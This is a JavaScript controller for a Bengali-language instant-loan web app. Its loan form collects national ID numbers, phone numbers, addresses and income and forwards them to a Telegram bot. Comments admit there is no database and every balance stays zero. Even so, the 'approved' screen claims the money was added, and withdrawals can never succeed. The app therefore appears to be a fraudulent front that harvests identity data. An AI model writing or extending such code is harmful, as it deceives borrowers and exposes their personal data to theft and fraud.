// ===================================================
// দ্রুত লোন সেবা — app.js
// Main user app controller
// ===================================================

// ── Global State ──────────────────────────────────────────
const AppState = {
  userId:      null,
  balance:     0,
  totalLoan:   0,
  totalWithdraw: 0,
  currentTab:  'dashboard',
  historyData: [],
  historyFilter: 'all'
};

// ═══════════════════════════════════════════════════════════
//  INITIALIZATION
// ═══════════════════════════════════════════════════════════
async function initApp() {
  try {
    // 1. Init user session
    AppState.userId = await Auth.initSession();

    // 2. Load user data and render dashboard
    await refreshDashboard();

    // 3. Initialize calculator with defaults
    calcEMI();

    // 4. Hide loading screen
    const loader = document.getElementById('loading-screen');
    if (loader) loader.classList.add('hidden');

    // 5. Handle deep-link hash navigation
    const hash = window.location.hash.replace('#', '');
    if (hash && ['loan','calculator','withdraw','history','dashboard'].includes(hash)) {
      switchTab(hash);
    } else {
      switchTab('calculator'); // ডিফল্ট ট্যাব: ক্যালকুলেটর
    }

    console.log('[App] Initialized. User ID:', AppState.userId);
  } catch (err) {
    console.error('[App] Init error:', err);
    // Still hide loader even on error
    const loader = document.getElementById('loading-screen');
    if (loader) loader.classList.add('hidden');
    showToast('অ্যাপ লোড করতে সমস্যা হয়েছে। পেজ রিফ্রেশ করুন।', 'error');
  }
}

// ═══════════════════════════════════════════════════════════
//  DASHBOARD
// ═══════════════════════════════════════════════════════════
async function refreshDashboard() {
  try {
    if (!AppState.userId) return;
    
    // কোনো ডাটাবেস নেই - সবার ব্যালেন্স ০
    AppState.balance = 0;
    AppState.totalLoan = 0;
    AppState.totalWithdraw = 0;
    
    renderDashboard();
  } catch (err) {
    console.warn('[App] Dashboard refresh skipped (no database):', err.message);
    renderDashboard();
  }
}

function renderDashboard() {
  // User ID display
  setTextSafe('card-user-id', AppState.userId || '—');

  // Balance (সবার জন্য ০ থাকবে, কারণ ডাটাবেস নেই)
  setTextSafe('card-balance',        formatBDT(AppState.balance));
  setTextSafe('card-total-loan',     formatBDT(AppState.totalLoan));
  setTextSafe('card-total-withdraw', formatBDT(AppState.totalWithdraw));

  // Withdraw section balance display
  setTextSafe('withdraw-balance-display', formatBDT(AppState.balance));
}

// ═══════════════════════════════════════════════════════════
//  TAB NAVIGATION
// ═══════════════════════════════════════════════════════════
function switchTab(tab) {
  // Hide all sections
  document.querySelectorAll('.app-section').forEach(s => s.classList.remove('active'));
  // Deactivate all nav items
  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));

  // Show target section
  const section = document.getElementById(`section-${tab}`);
  if (section) section.classList.add('active');

  // Activate nav item
  const navItem = document.getElementById(`nav-${tab}`);
  if (navItem) navItem.classList.add('active');

  // Update hash for deep-linking (no scroll)
  history.replaceState(null, '', `#${tab}`);

  AppState.currentTab = tab;

  // Lazy-load history when tab is switched to
  if (tab === 'history') loadHistory();

  // Refresh balance display when switching to withdraw
  if (tab === 'withdraw') {
    setTextSafe('withdraw-balance-display', formatBDT(AppState.balance));
  }
}

// ═══════════════════════════════════════════════════════════
//  HELPER FUNCTIONS FOR PENDING APPLICATIONS
// ═══════════════════════════════════════════════════════════
function storePendingApplication(applicationId, data) {
  const pending = JSON.parse(localStorage.getItem('pendingApplications')) || {};
  pending[applicationId] = {
    ...data,
    status: 'pending',
    createdAt: new Date().getTime()
  };
  localStorage.setItem('pendingApplications', JSON.stringify(pending));
  console.log('লোন আবেদন পোলিং এর জন্য সংরক্ষিত:', applicationId);
}

function storePendingWithdrawRequest(withdrawId, data) {
  const pending = JSON.parse(localStorage.getItem('pendingWithdrawals')) || {};
  pending[withdrawId] = {
    ...data,
    status: 'pending',
    createdAt: new Date().getTime()
  };
  localStorage.setItem('pendingWithdrawals', JSON.stringify(pending));
  console.log('Withdraw অনুরোধ পোলিং এর জন্য সংরক্ষিত:', withdrawId);
}

// ═══════════════════════════════════════════════════════════
//  LOAN APPLICATION FORM
// ═══════════════════════════════════════════════════════════
(function bindLoanForm() {
  const form = document.getElementById('loan-form');
  if (form) form.addEventListener('submit', handleLoanSubmit);
})();

async function handleLoanSubmit(e) {
  e.preventDefault();
  console.log('[Form] Loan submission started');

  // Collect values
  const name     = val('loan-name');
  const nid      = val('loan-nid');
  const phone    = val('loan-phone');
  const address  = val('loan-address');
  const amount   = val('loan-amount');
  const duration = val('loan-duration');
  const income   = val('loan-income');
  const consent  = document.getElementById('loan-consent')?.checked;

  console.log('[Form] Form data collected:', { name, nid, phone, address, amount, duration, income, consent });

  // Validate
  let valid = true;
  valid = validateField('loan-name', name,     n => n.length >= 3,   'সঠিক নাম লিখুন') && valid;
  valid = validateField('loan-nid',  nid,      n => /^\d{10,17}$/.test(n), 'সঠিক NID নম্বর লিখুন') && valid;
  valid = validateField('loan-phone', phone,   p => /^01[3-9]\d{8}$/.test(p), 'সঠিক মোবাইল নম্বর লিখুন') && valid;
  valid = validateField('loan-address', address, a => a.length >= 5, 'সঠিক ঠিকানা লিখুন') && valid;
  valid = validateField('loan-amount', amount,  a => parseFloat(a) >= CONFIG.MIN_LOAN_AMOUNT && parseFloat(a) <= CONFIG.MAX_LOAN_AMOUNT,
                        `ন্যূনতম ৳${CONFIG.MIN_LOAN_AMOUNT} এবং সর্বোচ্চ ৳${CONFIG.MAX_LOAN_AMOUNT}`) && valid;
  valid = validateField('loan-duration', duration, d => !!d, 'মেয়াদ বেছে নিন') && valid;
  valid = validateField('loan-income', income, i => parseFloat(i) >= 0, 'সঠিক আয় লিখুন') && valid;

  if (!consent) {
    setError('loan-consent', 'শর্তাবলী মেনে নিন');
    valid = false;
  } else {
    clearError('loan-consent');
  }

  if (!valid) {
    console.log('[Form] Validation failed');
    return;
  }

  console.log('[Form] Validation passed, submitting...');

  // Show spinner
  setSubmitLoading('loan-submit-btn', true);

  try {
    console.log('[DB] Calling submitLoanApplication...');
    
    // Submit to localStorage
    const result = await DB.submitLoanApplication({
      userId: AppState.userId, name, nid, phone, address, amount, duration, income
    });
    
    console.log('[DB] Loan application submitted:', result);

    // Store pending application for polling
    console.log('[Storage] Storing pending application...');
    storePendingApplication(result.id, {
      fullName: name,
      mobileNumber: phone,
      loanAmount: amount,
      status: 'pending'
    });

    // Show success UI
    console.log('[UI] Showing loading screen - waiting for Telegram approval...');
    document.getElementById('loan-form').style.display = 'none';
    const successDiv = document.getElementById('loan-success-msg');
    if (successDiv) {
      successDiv.style.display = 'block';
      successDiv.innerHTML = `
        <div style="text-align: center; padding: 40px 20px;">
          <div style="margin-bottom: 20px;">
            <div style="width: 50px; height: 50px; border: 4px solid #e0e0e0; border-top: 4px solid #4CAF50; border-radius: 50%; margin: 0 auto; animation: spin 1s linear infinite;"></div>
          </div>
          <h3 style="margin: 20px 0; color: #333;">অনুগ্রহ করে অপেক্ষা করুন...</h3>
          <p style="color: #666; font-size: 14px;">অনুমোদনের জন্য অপেক্ষা করছি...</p>
          <p id="loan-ref-id" style="color: #999; font-size: 12px; margin-top: 10px;"></p>
        </div>
        <style>
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
        </style>
      `;
    }
    
    setTextSafe('loan-ref-id', `রেফারেন্স নম্বর: ${result.id?.substring(0,8).toUpperCase()}`);

    // Send to Telegram (non-blocking - doesn't block form submission)
    console.log('[Telegram] Sending to Telegram...');
    try {
      const settings = getTelegramSettings();
      sendLoanApplicationToTelegram(result.id, {
        fullName: name,
        mobileNumber: phone,
        email: AppState.userId,
        nid: nid,
        address: address,
        loanAmount: amount,
        loanTerm: duration,
        annualIncome: income * 12,
        submittedAt: new Date().toLocaleString('bn-BD')
      }, settings);
    } catch (tErr) {
      console.warn('[Telegram] Error sending:', tErr.message);
    }

    // Start polling for approval (non-blocking)
    console.log('[Polling] Starting approval polling...');
    try {
      pollForApproval(result.id, amount);
    } catch (pErr) {
      console.warn('[Polling] Error:', pErr.message);
    }

  } catch (err) {
    console.error('[App] Loan submit error:', err);
    console.error('[App] Error stack:', err.stack);
    showToast('আবেদন জমা দিতে সমস্যা হয়েছে। আবার চেষ্টা করুন।', 'error');
  } finally {
    setSubmitLoading('loan-submit-btn', false);
  }
}

function resetLoanForm() {
  document.getElementById('loan-form').reset();
  document.getElementById('loan-form').style.display = 'block';
  document.getElementById('loan-success-msg').style.display = 'none';
  clearAllErrors('loan-form');
}

// ═══════════════════════════════════════════════════════════
//  LOAN APPROVAL HANDLERS (Called from UI buttons)
// ═══════════════════════════════════════════════════════════

function manualApproveLoan() {
  // Get the last pending loan ID
  const pending = JSON.parse(localStorage.getItem('pendingApplications')) || {};
  const loanId = Object.keys(pending)[0];
  
  if (!loanId) {
    showToast('কোন অপেক্ষমাণ আবেদন পাওয়া যায়নি', 'error');
    return;
  }

  const loanData = pending[loanId];
  
  // Mark as approved in localStorage
  pending[loanId].status = 'approved';
  localStorage.setItem('pendingApplications', JSON.stringify(pending));
  
  console.log('✅ Loan manually approved:', loanId);
  
  // Update success message
  const successDiv = document.getElementById('loan-success-msg');
  if (successDiv) {
    successDiv.innerHTML = `
      <div style="text-align: center; padding: 40px 20px;">
        <div style="font-size: 48px; margin-bottom: 15px;">✅</div>
        <h3 style="color: #4CAF50; margin: 10px 0;">লোন অনুমোদিত!</h3>
        <p style="color: #666; font-size: 14px; margin: 10px 0;">
          ৳${formatBDT(loanData.loanAmount)} আপনার ব্যালেন্সে যোগ হয়েছে।
        </p>
        <p style="color: #999; font-size: 12px; margin: 5px 0;">${loanId}</p>
        <button class="btn-primary btn-full" onclick="resetLoanForm()" style="margin-top: 20px;">
          নতুন আবেদন করুন
        </button>
      </div>
    `;
  }
  
  // Refresh dashboard
  refreshDashboard();
  showToast('লোন সফলভাবে অনুমোদিত হয়েছে!', 'success');
}

function manualRejectLoan() {
  // Get the last pending loan ID
  const pending = JSON.parse(localStorage.getItem('pendingApplications')) || {};
  const loanId = Object.keys(pending)[0];
  
  if (!loanId) {
    showToast('কোন অপেক্ষমাণ আবেদন পাওয়া যায়নি', 'error');
    return;
  }

  // Mark as rejected in localStorage
  pending[loanId].status = 'rejected';
  localStorage.setItem('pendingApplications', JSON.stringify(pending));
  
  console.log('❌ Loan manually rejected:', loanId);
  
  // Update success message
  const successDiv = document.getElementById('loan-success-msg');
  if (successDiv) {
    successDiv.innerHTML = `
      <div style="text-align: center; padding: 40px 20px;">
        <div style="font-size: 48px; margin-bottom: 15px;">❌</div>
        <h3 style="color: #f44336; margin: 10px 0;">আবেদন প্রত্যাখ্যান করা হয়েছে</h3>
        <p style="color: #666; font-size: 14px; margin: 10px 0;">
          দুঃখের সাথে জানাচ্ছি আপনার লোন অনুমোদন করা হয়নি।
        </p>
        <p style="color: #999; font-size: 12px; margin: 5px 0;">${loanId}</p>
        <button class="btn-primary btn-full" onclick="resetLoanForm()" style="margin-top: 20px;">
          নতুন আবেদন করুন
        </button>
      </div>
    `;
  }
  
  showToast('আবেদন প্রত্যাখ্যান করা হয়েছে', 'error');
}

// Withdraw Approval/Rejection
function manualApproveWithdraw() {
  const pending = JSON.parse(localStorage.getItem('pendingWithdrawals')) || {};
  const withdrawId = Object.keys(pending)[0];
  
  if (!withdrawId) {
    showToast('কোন অপেক্ষমাণ অনুরোধ পাওয়া যায়নি', 'error');
    return;
  }

  const withdrawData = pending[withdrawId];
  
  pending[withdrawId].status = 'approved';
  localStorage.setItem('pendingWithdrawals', JSON.stringify(pending));
  
  console.log('✅ Withdraw manually approved:', withdrawId);
  
  const successDiv = document.getElementById('withdraw-success-msg');
  if (successDiv) {
    successDiv.innerHTML = `
      <div style="text-align: center; padding: 40px 20px;">
        <div style="font-size: 48px; margin-bottom: 15px;">✅</div>
        <h3 style="color: #4CAF50; margin: 10px 0;">অনুরোধ অনুমোদিত!</h3>
        <p style="color: #666; font-size: 14px; margin: 10px 0;">
          ৳${formatBDT(withdrawData.withdrawAmount)} শীঘ্রই আপনার অ্যাকাউন্টে পাঠানো হবে।
        </p>
        <p style="color: #999; font-size: 12px; margin: 5px 0;">${withdrawId}</p>
        <button class="btn-primary btn-full" onclick="resetWithdrawForm()" style="margin-top: 20px;">
          নতুন অনুরোধ করুন
        </button>
      </div>
    `;
  }
  
  refreshDashboard();
  showToast('অনুরোধ সফলভাবে অনুমোদিত হয়েছে!', 'success');
}

function manualRejectWithdraw() {
  const pending = JSON.parse(localStorage.getItem('pendingWithdrawals')) || {};
  const withdrawId = Object.keys(pending)[0];
  
  if (!withdrawId) {
    showToast('কোন অপেক্ষমাণ অনুরোধ পাওয়া যায়নি', 'error');
    return;
  }

  pending[withdrawId].status = 'rejected';
  localStorage.setItem('pendingWithdrawals', JSON.stringify(pending));
  
  console.log('❌ Withdraw manually rejected:', withdrawId);
  
  const successDiv = document.getElementById('withdraw-success-msg');
  if (successDiv) {
    successDiv.innerHTML = `
      <div style="text-align: center; padding: 40px 20px;">
        <div style="font-size: 48px; margin-bottom: 15px;">❌</div>
        <h3 style="color: #f44336; margin: 10px 0;">অনুরোধ প্রত্যাখ্যান করা হয়েছে</h3>
        <p style="color: #666; font-size: 14px; margin: 10px 0;">
          দুঃখের সাথে জানাচ্ছি আপনার উত্তোলন অনুরোধ অনুমোদন করা হয়নি।
        </p>
        <p style="color: #999; font-size: 12px; margin: 5px 0;">${withdrawId}</p>
        <button class="btn-primary btn-full" onclick="resetWithdrawForm()" style="margin-top: 20px;">
          নতুন অনুরোধ করুন
        </button>
      </div>
    `;
  }
  
  showToast('অনুরোধ প্রত্যাখ্যান করা হয়েছে', 'error');
}

// ═══════════════════════════════════════════════════════════
//  LOAN CALCULATOR (EMI)
// ═══════════════════════════════════════════════════════════

// EMI = [P × r × (1+r)^n] / [(1+r)^n - 1]
function calcEMI() {
  const principal = parseFloat(document.getElementById('calc-amount')?.value) || 0;
  const annualRate= parseFloat(document.getElementById('calc-rate')?.value)   || 0;
  const months    = parseInt(document.getElementById('calc-duration')?.value)  || 1;

  if (principal <= 0 || months <= 0) return;

  const r = annualRate / 100 / 12; // Monthly interest rate

  let emi, totalPayment, totalInterest;

  if (r === 0) {
    // Interest-free: simple division
    emi = principal / months;
  } else {
    const factor = Math.pow(1 + r, months);
    emi = (principal * r * factor) / (factor - 1);
  }

  totalPayment  = emi * months;
  totalInterest = totalPayment - principal;

  setTextSafe('calc-emi',      formatBDT(emi));
  setTextSafe('calc-total',    formatBDT(totalPayment));
  setTextSafe('calc-interest', formatBDT(totalInterest));

  // Sync slider visuals
  syncSliderFill('calc-rate',     annualRate, 1, 36);
  syncSliderFill('calc-duration', months, 1, 60);
  syncSliderFill('calc-amount-slider', parseFloat(document.getElementById('calc-amount-slider')?.value) || principal, 1000, 500000);
}

function syncCalcSlider(type) {
  if (type === 'amount') {
    const sliderVal = document.getElementById('calc-amount-slider')?.value;
    const amtInput  = document.getElementById('calc-amount');
    if (amtInput) amtInput.value = sliderVal;
    syncSliderFill('calc-amount-slider', sliderVal, 1000, 500000);
  } else if (type === 'rate') {
    const val = document.getElementById('calc-rate')?.value;
    setTextSafe('calc-rate-display', `${val}%`);
    syncSliderFill('calc-rate', val, 1, 36);
  } else if (type === 'duration') {
    const val = document.getElementById('calc-duration')?.value;
    setTextSafe('calc-duration-display', `${val} মাস`);
    syncSliderFill('calc-duration', val, 1, 60);
  }
  calcEMI();
}

function syncSliderFill(id, value, min, max) {
  const el = document.getElementById(id);
  if (!el) return;
  const pct = ((value - min) / (max - min)) * 100;
  el.style.background =
    `linear-gradient(to right, var(--green-600) ${pct}%, var(--bg-input) ${pct}%)`;
}

// ═══════════════════════════════════════════════════════════
//  WITHDRAW FORM
// ═══════════════════════════════════════════════════════════
(function bindWithdrawForm() {
  const form = document.getElementById('withdraw-form');
  if (form) form.addEventListener('submit', handleWithdrawSubmit);
})();

async function handleWithdrawSubmit(e) {
  e.preventDefault();

  const name    = val('wd-name');
  const phone   = val('wd-phone');
  const amount  = parseFloat(val('wd-amount'));
  const consent = document.getElementById('wd-consent')?.checked;
  const methodEl= document.querySelector('input[name="method"]:checked');
  const method  = methodEl?.value;

  // Validate
  let valid = true;
  valid = validateField('wd-name',  name,  n => n.length >= 3,               'সঠিক নাম লিখুন') && valid;
  valid = validateField('wd-phone', phone, p => /^01[3-9]\d{8}$/.test(p),   'সঠিক মোবাইল নম্বর') && valid;
  valid = validateField('wd-amount',String(amount), _ =>
    amount >= CONFIG.MIN_WITHDRAW_AMOUNT && amount <= AppState.balance,
    amount > AppState.balance
      ? `আপনার ব্যালেন্স শুধু ${formatBDT(AppState.balance)}`
      : `ন্যূনতম উত্তোলন ৳${CONFIG.MIN_WITHDRAW_AMOUNT}`) && valid;

  if (!method) {
    setError('wd-method', 'পেমেন্ট পদ্ধতি বেছে নিন');
    valid = false;
  } else {
    clearError('wd-method');
  }

  if (!consent) {
    setError('wd-consent', 'সম্মতি দিন');
    valid = false;
  } else {
    clearError('wd-consent');
  }

  if (!valid) return;

  setSubmitLoading('wd-submit-btn', true);

  try {
    const result = await DB.submitWithdrawRequest({
      userId: AppState.userId, name, phone, amount, method
    });

    // Store pending request for polling
    storePendingWithdrawRequest(result.id, {
      fullName: name,
      mobileNumber: phone,
      withdrawAmount: amount,
      status: 'pending'
    });

    // Show loading screen (NOT success yet)
    console.log('[UI] Showing loading screen - waiting for Telegram approval...');
    document.getElementById('withdraw-form').style.display = 'none';
    const successDiv = document.getElementById('withdraw-success-msg');
    if (successDiv) {
      successDiv.style.display = 'block';
      successDiv.innerHTML = `
        <div style="text-align: center; padding: 40px 20px;">
          <div style="margin-bottom: 20px;">
            <div style="width: 50px; height: 50px; border: 4px solid #e0e0e0; border-top: 4px solid #4CAF50; border-radius: 50%; margin: 0 auto; animation: spin 1s linear infinite;"></div>
          </div>
          <h3 style="margin: 20px 0; color: #333;">অনুগ্রহ করে অপেক্ষা করুন...</h3>
          <p style="color: #666; font-size: 14px;">টেলিগ্রাম বটে অনুমোদনের জন্য অপেক্ষা করছি...</p>
          <p id="withdraw-ref-id" style="color: #999; font-size: 12px; margin-top: 10px;"></p>
        </div>
        <style>
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
        </style>
      `;
    }
    
    setTextSafe('withdraw-ref-id', `রেফারেন্স নম্বর: ${result.id?.substring(0,8).toUpperCase()}`);

    // Send to Telegram (non-blocking)
    try {
      const settings = getTelegramSettings();
      sendWithdrawRequestToTelegram(result.id, {
        fullName: name,
        mobileNumber: phone,
        withdrawAmount: amount,
        withdrawMethod: method,
        submittedAt: new Date().toLocaleString('bn-BD')
      }, settings);
    } catch (tErr) {
      console.warn('[Telegram] Error sending withdraw:', tErr.message);
    }

    // Start polling for approval (non-blocking)
    try {
      pollForWithdrawApproval(result.id, amount);
    } catch (pErr) {
      console.warn('[Polling] Error:', pErr.message);
    }

  } catch (err) {
    console.error('[App] Withdraw submit error:', err);
    showToast('অনুরোধ পাঠাতে সমস্যা হয়েছে। আবার চেষ্টা করুন।', 'error');
  } finally {
    setSubmitLoading('wd-submit-btn', false);
  }
}

function resetWithdrawForm() {
  document.getElementById('withdraw-form').reset();
  document.getElementById('withdraw-form').style.display = 'block';
  document.getElementById('withdraw-success-msg').style.display = 'none';
  clearAllErrors('withdraw-form');
}

// ═══════════════════════════════════════════════════════════
//  TRANSACTION HISTORY
// ═══════════════════════════════════════════════════════════
async function loadHistory() {
  const listEl = document.getElementById('history-list');
  const emptyEl = document.getElementById('history-empty');

  // Loading state
  emptyEl.style.display  = 'none';
  listEl.innerHTML       = '<div class="history-empty"><div class="spinner-ring" style="border-top-color:var(--green-500);width:32px;height:32px"></div></div>';

  try {
    AppState.historyData = await DB.getTransactionHistory(AppState.userId);
    renderHistory();
  } catch (err) {
    console.warn('[App] loadHistory error:', err);
    listEl.innerHTML = '';
    emptyEl.style.display = 'flex';
  }
}

function filterHistory(filter) {
  AppState.historyFilter = filter;

  // Update filter tab styles
  ['all','loan','withdraw'].forEach(f => {
    const tab = document.getElementById(`filter-${f}`);
    tab?.classList.toggle('active', f === filter);
  });

  renderHistory();
}

function renderHistory() {
  const listEl  = document.getElementById('history-list');
  const emptyEl = document.getElementById('history-empty');
  if (!listEl) return;

  const filtered = AppState.historyFilter === 'all'
    ? AppState.historyData
    : AppState.historyData.filter(t => t.type === AppState.historyFilter);

  listEl.innerHTML = '';

  if (!filtered.length) {
    emptyEl.style.display = 'flex';
    return;
  }

  emptyEl.style.display = 'none';

  filtered.forEach(txn => {
    const isLoan = txn.type === 'loan';
    const date   = formatDate(txn.created_at);

    const item = document.createElement('div');
    item.className = 'txn-item';
    item.innerHTML = `
      <div class="txn-icon ${txn.type}">
        ${isLoan
          ? `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="12" y1="18" x2="12" y2="12"/><line x1="9" y1="15" x2="15" y2="15"/></svg>`
          : `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>`
        }
      </div>
      <div class="txn-details">
        <div class="txn-type">${txn.typeBn}</div>
        <div class="txn-meta">${date}${txn.method ? ' · ' + txn.method : ''}</div>
      </div>
      <div class="txn-right">
        <div class="txn-amount ${isLoan ? '' : 'debit'}">${isLoan ? '+' : '-'}${formatBDT(txn.amount)}</div>
        <span class="status-badge ${txn.status}">${statusBn(txn.status)}</span>
      </div>
    `;
    listEl.appendChild(item);
  });
}

// ═══════════════════════════════════════════════════════════
//  UTILITY HELPERS
// ═══════════════════════════════════════════════════════════

function formatBDT(amount) {
  const n = parseFloat(amount) || 0;
  return `৳ ${n.toLocaleString('en-BD', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
}

function formatDate(isoString) {
  if (!isoString) return '—';
  return new Date(isoString).toLocaleString('bn-BD', {
    timeZone:  'Asia/Dhaka',
    year:      'numeric',
    month:     'short',
    day:       'numeric',
    hour:      '2-digit',
    minute:    '2-digit'
  });
}

function statusBn(status) {
  return { pending: 'অপেক্ষায়', approved: 'অনুমোদিত', rejected: 'প্রত্যাখ্যাত' }[status] || status;
}

function val(id) {
  return (document.getElementById(id)?.value || '').trim();
}

function setTextSafe(id, text) {
  const el = document.getElementById(id);
  if (el) el.textContent = text;
}

function setError(id, msg) {
  const el = document.getElementById(`err-${id}`);
  if (el) el.textContent = msg;
  const input = document.getElementById(id);
  if (input) input.classList.add('error');
}

function clearError(id) {
  const el = document.getElementById(`err-${id}`);
  if (el) el.textContent = '';
  const input = document.getElementById(id);
  if (input) input.classList.remove('error');
}

function validateField(id, value, testFn, errorMsg) {
  if (!testFn(value)) {
    setError(id, errorMsg);
    return false;
  }
  clearError(id);
  return true;
}

function clearAllErrors(formId) {
  const form = document.getElementById(formId);
  if (!form) return;
  form.querySelectorAll('.form-error').forEach(el => el.textContent = '');
  form.querySelectorAll('.form-input').forEach(el => el.classList.remove('error'));
}

function setSubmitLoading(btnId, loading) {
  const btn     = document.getElementById(btnId);
  if (!btn) return;
  const textEl  = btn.querySelector('.btn-text');
  const spinEl  = btn.querySelector('.btn-spinner');
  btn.disabled  = loading;
  if (textEl) textEl.style.display = loading ? 'none' : 'inline';
  if (spinEl) spinEl.style.display = loading ? 'flex' : 'none';
}

// ── Toast Notifications ───────────────────────────────────
function showToast(message, type = 'info', duration = 4000) {
  const container = document.getElementById('toast-container');
  if (!container) return;

  const icons = {
    success: '✓',
    error:   '✕',
    info:    'ℹ'
  };

  const toast = document.createElement('div');
  toast.className = `toast ${type}`;
  toast.innerHTML = `<span style="font-weight:700;font-size:1rem">${icons[type] || 'ℹ'}</span><span>${message}</span>`;
  container.appendChild(toast);

  setTimeout(() => {
    toast.classList.add('removing');
    setTimeout(() => toast.remove(), 350);
  }, duration);
}

// ═══════════════════════════════════════════════════════════
//  BOOT
// ═══════════════════════════════════════════════════════════
window.addEventListener('DOMContentLoaded', initApp);
